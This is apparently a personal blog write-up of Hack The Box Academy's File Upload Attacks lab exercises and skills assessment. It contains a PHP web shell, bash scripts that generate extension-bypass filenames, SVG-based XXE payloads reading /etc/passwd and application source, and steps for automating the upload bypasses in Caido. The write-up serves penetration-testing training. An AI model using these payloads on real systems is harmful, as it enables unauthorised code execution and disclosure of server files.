---
layout: post
title:  "Hack The Box - Academy - File Upload Attacks"
description: "Follow this comprehensive walkthrough of the Hack The Box Academy File Upload Attacks Skills Assessment. Master file upload attack techniques to exploit vulnerable web applications using Caido, perfect for enhancing your penetration testing skills and preparing for HTB challenges."
date:   2024-10-23 18:48
image:  /images/htb/file-upload-attacks/logo.png
tags:   [file-upload-attacks,cbbh]
categories: [htbacademy]
---

### Explore this detailed walkthrough of Hack The Box Academy's File Upload Attacks module. Learn effective techniques to exploit file upload vulnerabilities.

>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/136/section/1259">File Upload Attacks</a><br/>
<a href="https://jacozwarts.github.io/images/htb/file-upload-attacks/File_Upload_Attacks_Module_Cheat_Sheet.pdf">File Upload Attacks - Cheat Sheet</a><br/>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PayloadsAllTheThings - PHP Extensions List</a><br/>
<a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of file signatures</a><br/>


<hr/>

## Notes:
Filter image content types from Content-Type wordlist:

**Wordlist path:** <br/>
`/usr/share/wordlists/seclists/Miscellaneous/Web/content-type.txt`
```
cat content-type.txt | grep 'image/' > image-content-types.txt
```

## Whitelist Filters - Exercise

### The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read `"/flag.txt"`

Create a `custom wordlist` by executing the below bash script:
```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtml'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

#### Step-by-Step Guide to Automating File Upload Testing with Caido
- Launch Caido and navigate to the Automation section.

- Initiate an Upload Request: 
Create an upload request and set the filename as the automation payload.

- Use the Wordlist:
Copy the content from the specified wordlist and paste it into the Simple List input field within Caido.

- Start the Automation
Begin the automation process by clicking the start button.

- Review the Results
Once the automation completes, review the results.

- Filter the Results
Sort the results by length in descending order and look for responses with a length of `193`.

- Test the Successful File Extensions
Identify which file extensions were successfully uploaded and test them further for potential vulnerabilities.

`Payload:`

```
<?php system($_REQUEST['cmd']); ?>
```

![Caido White list Request](/images/htb/file-upload-attacks/white-list-filter-caido-request.png)

![Caido White list Result](/images/htb/file-upload-attacks/white-list-filter-caido-result.png)

![Webshell](/images/htb/file-upload-attacks/white-list-filter-web-shell.png)

Navigate through the folders to locate the `flag.txt` file.

![Webshell](/images/htb/file-upload-attacks/white-list-filter-flag-result.png)
<hr/>

## Type Filters - Exercise

### The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at `"/flag.txt"`

Use a png file and add the .phtml extension in the filename add the web shell below the MIME type and execute the upload functionality.
![Type filters - Request](/images/htb/file-upload-attacks/type-filters-request.png)
![Type filters - Result](/images/htb/file-upload-attacks/type-filters-result.png)

<hr/>

## Skills Assessment
><b>Overview:</b>
You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.<br/><br/>
Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.

### Extra Exercise
Try to note down the main security issues found with the web application and the necessary security measures to mitigate these issues and prevent further exploitation.


### Try to exploit the upload form to read the flag found at the root directory "/".
During our analysis of the web application, we identified a file upload feature located on the 'Contact Us' page.

#### 1. Identify File Storage: 
When uploading an image, the application does not reveal where the uploaded file is stored.

#### 2. Access Source Code: 
To understand the file storage mechanism, obtain the source code of the upload.php file.

#### 3. Monitor POST Method: 
Observe that when an image is uploaded, the POST method returns the image result.

#### 4. Test for Vulnerability: 
Use an SVG file to test if the application is vulnerable to `XML External Entity (XXE)` attacks. I used the payload below to check if we can read the contents of the `/etc/passwd` file.

```
Content-Disposition: form-data; name="uploadFile"; filename="SVG-XXE-Injection.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

![Skills Asssessment XXE - Result](/images/htb/file-upload-attacks/skills-assessment-xxe-test.png)

#### 5. Extract Upload.php source code:
```
Content-Disposition: form-data; name="uploadFile"; filename="SVG-XXE-Injection.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

![Skills Asssessment XXE - Upload.php Source Code](/images/htb/file-upload-attacks/skills-assessment-upload-source-code.png)

Use Caido to base64 decode the payload and analyze the `upload.php` source code.

![Decode payload with Caido](/images/htb/file-upload-attacks/skills-assessment-decode-caido.png)

`Uploade.php source code decrypted:`

![Upload.php source code decrypted](/images/htb/file-upload-attacks/skills-assessment-upload-source-code-decrypted.png)

After analyzing the source code, you'll be able to identify the upload directory and the format of the saved file. One issue I encountered was related to time zones; I was in the AEST timezone with a different date to the server. Additionally, you can view the code to bypass the image filters. Now, upload a new image containing a web shell.

Leverage the custom wordlist below to generate potential extensions that are not blacklisted. Begin by sending an upload request to Caido Automate, mark the `filename` as the `placeholder` and load the wordlist using the Simple List option. In the request body, insert the PHP web shell after the `MIME type`, then click "Run" to initiate the automation. Finally, review the results to identify the allowed extensions.

Create a `custom wordlist` by executing the below bash script:

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtml'; do
        echo "Zwarts$char$ext.png" >> wordlist.txt
        echo "Zwarts$ext$char.png" >> wordlist.txt
        echo "Zwarts.png$char$ext" >> wordlist.txt
        echo "Zwarts.png$ext$char" >> wordlist.txt
    done
done
```

```
<?php system($_REQUEST['cmd']); ?>
```
![Caido Automate Request](/images/htb/file-upload-attacks/skills-assessment-caido-automate.png)

`Look for results that has a content length > 190`

![Caido Automate Results](/images/htb/file-upload-attacks/skills-assessment-caido-automate-results.png)

![Flag Result](/images/htb/file-upload-attacks/skills-assessment-flag-result.png)

<hr/>